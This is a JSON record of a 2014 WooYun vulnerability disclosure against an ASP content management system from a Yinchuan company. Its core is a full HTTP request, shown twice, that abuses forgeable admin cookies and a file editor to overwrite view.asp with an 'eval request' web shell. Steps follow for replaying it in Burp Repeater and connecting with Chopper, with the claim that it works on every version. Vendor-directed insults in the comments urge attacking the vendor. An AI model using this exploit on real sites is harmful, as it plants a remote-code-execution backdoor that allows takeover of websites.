{"id": 55070, "wybug_id": "wooyun-2014-062244", "wybug_title": "银川迅雷网络全版本通杀Getshell", "wybug_corp": "银川迅雷网络有限公司", "wybug_author": "浅蓝", "wybug_date": "2014-05-26 11:26", "wybug_open_date": "2014-07-10 11:26", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-26：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-07-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 银川迅雷网络全版本通杀Getshell 详细说明：  \nPOST /admin/wj.asp?Action=editfile&folder=..&url=../view.asp HTTP/1.1Host: ************Proxy-Connection: keep-aliveContent-Length: 709Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://nxlwtv.com.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedReferer: http://********/admin/wj.asp?Action=editfile&folder=..&url=../view.aspAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: ASPSESSIONIDSCCRCATR=BCCEHNEADCDFDGOAPCCDMLNM; CNZZDATA3143027=cnzz_eid%3D1585179978-1400986404-%26ntime%3D1400986404%26cnzz_a%3D0%26ltime%3D1400986403525; cmsname=admin; cmsid=1url=..%2Fview.asp&folder=..&dpost=ok&content=%3C%21--%23include+file%3D%22inc%2Fconn.asp%22--%3E%0D%0A%3C%21--%23include+file%3D%22inc%2FLabelFunction.asp%22--%3E%0D%0A%3C%25%0D%0Aclassid%3Dconn.execute%28%22select+classid+from+cms_article+where+id+%3D+%22%26getnum%28%22id%22%29%29%280%29%0D%0Aset+rs+%3D+conn.execute%28%22select+template_view_id+from+cms_class+where+id+%3D+%22%26classid%29%0D%0Aset+aa+%3D+new+art_list%0D%0Aaa.templateurl%3DGetTemplate%284%2Crs%280%29%29%0D%0Aaa.templateaid%3Dgetnum%28%22id%22%29%0D%0Aaa.templatecid%3Dclassid%0D%0Aaa.templateapage%3Dgetnum%28%22apage%22%29%0D%0Astr%3Daa.tag%28%29%0D%0Aresponse.Write+str%0D%0A%25%3E%0D%0A%0D%0A%3C%25eval+request%28%22x%22%29%25%3E\n把这段内容复制到burp repeater上  http://url/view.asp密码x\n\n\n\n菜刀连接\n\n换一个网站\n\n再换一个\n\n\n\n全版本通杀。\n\nhttp://www.ycxl.net/index.php?m=Article&a=index&id=22 迅雷cms精选案例   漏洞证明：  \nPOST /admin/wj.asp?Action=editfile&folder=..&url=../view.asp HTTP/1.1Host: ************Proxy-Connection: keep-aliveContent-Length: 709Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://nxlwtv.com.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedReferer: http://********/admin/wj.asp?Action=editfile&folder=..&url=../view.aspAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: ASPSESSIONIDSCCRCATR=BCCEHNEADCDFDGOAPCCDMLNM; CNZZDATA3143027=cnzz_eid%3D1585179978-1400986404-%26ntime%3D1400986404%26cnzz_a%3D0%26ltime%3D1400986403525; cmsname=admin; cmsid=1url=..%2Fview.asp&folder=..&dpost=ok&content=%3C%21--%23include+file%3D%22inc%2Fconn.asp%22--%3E%0D%0A%3C%21--%23include+file%3D%22inc%2FLabelFunction.asp%22--%3E%0D%0A%3C%25%0D%0Aclassid%3Dconn.execute%28%22select+classid+from+cms_article+where+id+%3D+%22%26getnum%28%22id%22%29%29%280%29%0D%0Aset+rs+%3D+conn.execute%28%22select+template_view_id+from+cms_class+where+id+%3D+%22%26classid%29%0D%0Aset+aa+%3D+new+art_list%0D%0Aaa.templateurl%3DGetTemplate%284%2Crs%280%29%29%0D%0Aaa.templateaid%3Dgetnum%28%22id%22%29%0D%0Aaa.templatecid%3Dclassid%0D%0Aaa.templateapage%3Dgetnum%28%22apage%22%29%0D%0Astr%3Daa.tag%28%29%0D%0Aresponse.Write+str%0D%0A%25%3E%0D%0A%0D%0A%3C%25eval+request%28%22x%22%29%25%3E\n把这段内容复制到burp repeater上  http://url/view.asp密码x\n\n\n\n菜刀连接\n\n换一个网站\n\n再换一个\n\n\n\n全版本通杀。\n\nhttp://www.ycxl.net/index.php?m=Article&a=index&id=22 迅雷cms精选案例   修复方案：  都是cookie惹的祸，求20rank   版权声明：转载请注明来源 浅蓝@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-06-23 09:00 |    \t\tTeufel \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:13        | 广告位招租)\t\t \n  银川迅雷不是深圳迅雷估计没人认领了    \n     2014-06-23 09:30 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  @Teufel -.-靠。傻叼厂商    \n     2014-10-04 14:02 |    \t\tY9Rc \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 技术0，攻击0，防御0，敏捷0，关注信息安全...)\t\t \n  没人认领,就日死这个傻吊。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}